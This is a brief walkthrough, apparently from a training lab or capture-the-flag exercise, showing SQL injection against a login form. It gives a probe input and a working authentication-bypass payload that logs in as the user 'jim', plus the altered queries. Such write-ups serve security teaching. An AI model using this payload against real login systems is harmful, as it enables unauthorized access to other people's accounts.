try inserting the email as : test'
we see that we get the SQL statement to fetch user details
SELECT * FROM Users WHERE email = 'test'' AND password = '1aff91130ca46149c98cfbcb362432bb'

in order to login as jim, a wise guess is that his email could contain the term "jim"
so by setting the injection string as 
' or 1=1 and email LIKE ('%jim%');-- -
the query is now modified to the following, and hence authenticating us as jim
SELECT * FROM Users WHERE email = '' or 1=1 and email LIKE ('%jim%');-- -' AND password = '1aff91130ca46149c98cfbcb362432bb'
